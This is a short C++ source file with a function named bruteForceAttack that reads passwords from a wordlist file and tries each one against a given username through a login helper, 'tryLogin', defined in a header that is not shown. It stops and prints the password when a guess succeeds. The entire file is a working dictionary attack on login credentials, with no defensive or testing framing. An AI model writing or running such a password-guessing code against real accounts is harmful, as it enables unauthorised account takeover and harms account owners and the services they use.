#include <thread>
#include <chrono>
#include <iostream>
#include <fstream>
#include <string>
#include "bfAttack.h"
#include "api.h"


void bruteForceAttack(const std::string& username, const std::string& filePath) {
	std::ifstream file(filePath);
	if (!file.is_open()) {
		std::cerr << "Error!!! Unable to open file!" << std::endl;
		return;
	}

	std::cout << "Passwords are being checked, this may take more or less time..." << std::endl;
	std::cout << "Please wait..." << std::endl;

	bool checkFind = false;

	std::string password;
	while (std::getline(file, password)) {
		if (tryLogin(username, password)) {
			std::cout << "Password found: " << password << std::endl;
			checkFind = true;
			break;
		}
	}

	if (!checkFind) {
		std::cout << "Password didn't find." << std::endl;
	}

	file.close();

}
